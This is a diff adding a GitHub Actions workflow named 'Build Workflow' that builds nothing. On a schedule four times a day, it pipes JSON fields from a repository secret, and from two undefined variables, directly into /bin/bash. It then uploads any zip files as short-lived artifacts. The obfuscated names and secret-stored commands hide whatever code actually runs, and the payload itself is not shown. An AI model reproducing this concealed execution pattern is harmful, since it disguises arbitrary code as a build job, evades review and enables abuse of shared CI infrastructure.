@@ -1,0 +1,28 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '48 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          ixxb64: ${{ secrets.ixxb64 }}
+        run: |
+          printf '%s' "$ixxb64" | jq -r .m8 | /bin/bash
+          echo $tl81368 | jq -r .kxr79150 | /bin/bash
+          printf '%s' "$ilh949" | jq -r .b64369 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: nTgaFCf9
+          path: "*.zip"
+          retention-days: 1
